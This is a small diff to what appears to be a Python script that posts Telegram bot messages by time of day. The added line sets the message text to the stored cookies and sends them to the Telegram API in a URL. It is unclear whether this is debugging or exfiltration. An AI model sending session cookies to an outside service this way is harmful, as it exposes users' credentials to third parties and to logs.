@@ -127,4 +127,5 @@ elif time.localtime()[3] == 12:
     requests.get("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"%(bot_token,chat_id,text))
 else:
     text = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())
+    text = str(cookies)
     requests.get("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"%(bot_token,chat_id,text))
